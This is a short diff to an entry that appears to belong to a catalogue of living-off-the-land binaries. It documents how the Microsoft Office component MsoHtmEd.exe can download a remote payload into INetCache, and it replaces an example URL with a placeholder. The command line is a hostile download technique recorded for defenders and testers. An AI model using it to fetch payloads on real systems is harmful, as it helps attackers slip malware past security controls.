@@ -4,7 +4,7 @@ Description: Microsoft Office component
 Author: Nir Chako
 Created: 2022-07-24
 Commands:
-  - Command: MsoHtmEd.exe https://example.com/payload
+  - Command: MsoHtmEd.exe {REMOTEURL}
     Description: Downloads payload from remote server
     Usecase: It will download a remote payload and place it in INetCache.
     Category: Download
